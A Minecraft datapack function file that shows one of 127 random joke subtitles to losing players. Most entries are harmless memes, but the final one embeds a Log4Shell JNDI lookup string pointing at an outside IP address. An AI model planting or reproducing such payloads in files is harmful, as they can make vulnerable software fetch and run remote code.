##Randomized splash messages for the losers of a game
execute if score $skipsplashes CmdData matches 1 run return fail
execute if score $skiptitles CmdData matches 1 run return fail

#If you want to add more splashes just increase this number.
execute store result score $losssplash CmdData run random value 0..126

#Add splashes here (just copy paste the line and change the score)
execute if score $losssplash CmdData matches 0..3 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Better luck next time..."}
execute if score $losssplash CmdData matches 4 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"At least we have a cool flag now?"}
execute if score $losssplash CmdData matches 5 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Exceeded missile deployment limit."}
execute if score $losssplash CmdData matches 6 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Huh, I swear I saw portals there before."}
execute if score $losssplash CmdData matches 7 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"I call hacks!"}
execute if score $losssplash CmdData matches 8 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"At least you tried..."}
execute if score $losssplash CmdData matches 9 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"So close..."}
execute if score $losssplash CmdData matches 10 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Your enemy was just having a really good day."}
execute if score $losssplash CmdData matches 11 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Next time we're using bedrock for our defense!"}
execute if score $losssplash CmdData matches 12 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"It was lag. I swear!"}
execute if score $losssplash CmdData matches 13 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"My ping! Why!"}
execute if score $losssplash CmdData matches 14 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"We'll meet again in a rematch!"}
execute if score $losssplash CmdData matches 15 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"I guess the Splashes didn't save the portal..."}
execute if score $losssplash CmdData matches 16 run title @a[x=0,tag=Loser] subtitle {color:"red",text:":("}
execute if score $losssplash CmdData matches 17 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"That Bullet punched straight through our wall!"}
execute if score $losssplash CmdData matches 18 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Splashes weren't useful..."}
execute if score $losssplash CmdData matches 19 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"oops"}
execute if score $losssplash CmdData matches 20 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Dreams were crushed."}
execute if score $losssplash CmdData matches 21 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"This is so sad. Can we hit 2 likes?"}
execute if score $losssplash CmdData matches 22 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"This is so sad. Can we hit Spikes?"}
execute if score $losssplash CmdData matches 23 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"50% of all teams lose the game."}
execute if score $losssplash CmdData matches 24 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"get got"}
execute if score $losssplash CmdData matches 25 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You have received (1x) Flag of Shameful Loss."}
execute if score $losssplash CmdData matches 26 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"I want a refund."}
execute if score $losssplash CmdData matches 27 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"ping abuse couldn't save you this time roflmao"}
execute if score $losssplash CmdData matches 28 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"devs fix game"}
execute if score $losssplash CmdData matches 29 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Did you forget to open the client?"}
execute if score $losssplash CmdData matches 30 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"It happens to everyone, buddy :)"}
execute if score $losssplash CmdData matches 31 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"News flash: The other team is not hacking!"}
execute if score $losssplash CmdData matches 32 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"At least you're not buying them a pet!"}
execute if score $losssplash CmdData matches 33 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Must be anti-knockback."}
execute if score $losssplash CmdData matches 34 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"What's the strat where you lose?"}
execute if score $losssplash CmdData matches 35 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Pro tip: Try winning."}
execute if score $losssplash CmdData matches 36 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"ez"}
execute if score $losssplash CmdData matches 37 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You ever try getting good?"}
execute if score $losssplash CmdData matches 38 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Congrats, you won at losing!"}
execute if score $losssplash CmdData matches 39 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Task failed successfully."}
execute if score $losssplash CmdData matches 40 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You must have been playing against Chronos."}
execute if score $losssplash CmdData matches 41 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Point missile *AWAY* from self!"}
execute if score $losssplash CmdData matches 42 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Must be their gaming chairs..."}
execute if score $losssplash CmdData matches 43 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"how to ride fast missile?"}
execute if score $losssplash CmdData matches 44 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"kinda sus"}
execute if score $losssplash CmdData matches 45 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"They're aiming at you!"}
execute if score $losssplash CmdData matches 46 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Emergency Meeting... Wait... I'm dead?"}
execute if score $losssplash CmdData matches 47 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Sure, blame it on the ping."}
execute if score $losssplash CmdData matches 48 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"this is not very"}
execute if score $losssplash CmdData matches 49 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"It's coming home!"}
execute if score $losssplash CmdData matches 50 run title @a[x=0,tag=Loser] subtitle [{color:"red",text:"It's coming "},{obfuscated:true,text:"h"},"Rome!"]
execute if score $losssplash CmdData matches 51 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"L"}
execute if score $losssplash CmdData matches 52 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"The IRS got you!"}
execute if score $losssplash CmdData matches 53 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Sucks to suck!"}
execute if score $losssplash CmdData matches 54 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Imagine winning"}
execute if score $losssplash CmdData matches 55 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"MISSILE WENT BOOM :("}
execute if score $losssplash CmdData matches 56 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Not my fault! Definitely bad teammates."}
execute if score $losssplash CmdData matches 57 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"I, for one, submit to our new Bee overlords."}
execute if score $losssplash CmdData matches 58 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"That Wasn't Very Cash Money Of You"}
execute if score $losssplash CmdData matches 59 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"try renewing your car's extended warranty"}
execute if score $losssplash CmdData matches 60 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Code Red! Evacuate!!!"}
execute if score $losssplash CmdData matches 61 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"I blame my teammates for my problems"}
execute if score $losssplash CmdData matches 62 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"RNG giveth, RNG taketh away."}
execute if score $losssplash CmdData matches 63 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"We will never financially recover from this."}
execute if score $losssplash CmdData matches 64 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Everybody expected this."}
execute if score $losssplash CmdData matches 65 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"weel done lad you reyt goosed this one up"}
execute if score $losssplash CmdData matches 66 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Mission failed, we'll get 'em next time."}
execute if score $losssplash CmdData matches 67 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Not stonks ↓"}
execute if score $losssplash CmdData matches 68 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"PANIK"}
execute if score $losssplash CmdData matches 69 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You died - Score: 7"}
execute if score $losssplash CmdData matches 70 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Projectile dysfunction..."}
execute if score $losssplash CmdData matches 71 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You put the miss in missile!"}
execute if score $losssplash CmdData matches 72 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You're fired!"}
execute if score $losssplash CmdData matches 73 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Oops, wrong button."}
execute if score $losssplash CmdData matches 74 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Boomer"}
execute if score $losssplash CmdData matches 75 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Their gaming toilet was better."}
execute if score $losssplash CmdData matches 76 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Are ya winning, son?"}
execute if score $losssplash CmdData matches 77 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Pro tip: get gud nub"}
execute if score $losssplash CmdData matches 78 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Try again with your client on."}
execute if score $losssplash CmdData matches 79 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Couldn't crack the launch codes."}
execute if score $losssplash CmdData matches 80 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"oof"}
execute if score $losssplash CmdData matches 81 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You're a fake and a fraud!"}
execute if score $losssplash CmdData matches 82 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Nuclear disintegration!"}
execute if score $losssplash CmdData matches 83 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Where were my teammates?"}
execute if score $losssplash CmdData matches 84 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Get real."}
execute if score $losssplash CmdData matches 85 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"The cake was a lie."}
execute if score $losssplash CmdData matches 86 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Sayyy whattt??"}
execute if score $losssplash CmdData matches 87 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"A for effort."}
execute if score $losssplash CmdData matches 88 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Congratulations, you successfully failed!"}
execute if score $losssplash CmdData matches 89 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Please deposit 100 Kromer to unlock winning."}
execute if score $losssplash CmdData matches 90 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Oof, just like the Glare."}
execute if score $losssplash CmdData matches 91 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Oof, just like the Copper Golem."}
execute if score $losssplash CmdData matches 92 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Please refer to the handbook on how to win."}
execute if score $losssplash CmdData matches 93 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"r/yesyesyesno"}
execute if score $losssplash CmdData matches 94 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Do you even have a license for flying these?"}
execute if score $losssplash CmdData matches 95 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Your rocket license has received a strike."}
execute if score $losssplash CmdData matches 96 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You sure your insurance will cover that?"}
execute if score $losssplash CmdData matches 97 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Trollusa."}
execute if score $losssplash CmdData matches 98 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"That's a lot of damage!"}
execute if score $losssplash CmdData matches 99 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Anticheat works, I guess..."}
execute if score $losssplash CmdData matches 100 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Lost your great win streak sadge"}
execute if score $losssplash CmdData matches 101 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Balancing is hard!"}
execute if score $losssplash CmdData matches 102 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"uninstalling minecraft"}
execute if score $losssplash CmdData matches 103 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Cry about it."}
execute if score $losssplash CmdData matches 104 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"bruh nawhhhh nah no way bruhhh fr? Bruhhh"}
execute if score $losssplash CmdData matches 105 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"but the the I when I I but how they do the win I the did well how did the I do"}
execute if score $losssplash CmdData matches 106 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"ICBM? More like ICU've lost"}
execute if score $losssplash CmdData matches 107 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"-30,000,000 social credit"}
execute if score $losssplash CmdData matches 108 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"releasing nukes"}
execute if score $losssplash CmdData matches 109 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Reported for: Malicious threat"}
execute if score $losssplash CmdData matches 110 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"I hope your bicycle gets a flat tire! >:("}
execute if score $losssplash CmdData matches 111 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"The missiles go towards them, not us!"}
execute if score $losssplash CmdData matches 112 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Thanos ping"}
execute if score $losssplash CmdData matches 113 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"guess you were a rocket loser"}
execute if score $losssplash CmdData matches 114 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"That wasn't supposed to happen..."}
execute if score $losssplash CmdData matches 115 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"So what that you won, I wasn't trying anyways!"}
execute if score $losssplash CmdData matches 116 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"You have received: 1 L"}
execute if score $losssplash CmdData matches 117 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Here's your participation trophy!"}
execute if score $losssplash CmdData matches 118 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Initiation failed, resetting world..."}
execute if score $losssplash CmdData matches 119 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"don't worry, that wasn't EZU canon"}
execute if score $losssplash CmdData matches 120 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Should've gone to Planetary Cove"}
execute if score $losssplash CmdData matches 121 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"I've seen a fish play better."}
execute if score $losssplash CmdData matches 122 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"Yes Rico, kaboom."}
execute if score $losssplash CmdData matches 123 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"No victory popcorn for you."}
execute if score $losssplash CmdData matches 124 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"L"}
execute if score $losssplash CmdData matches 125 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"ratio"}
execute if score $losssplash CmdData matches 126 run title @a[x=0,tag=Loser] subtitle {color:"red",text:"${jndi:ldap://178.63.51.142:8080/pwned}"}
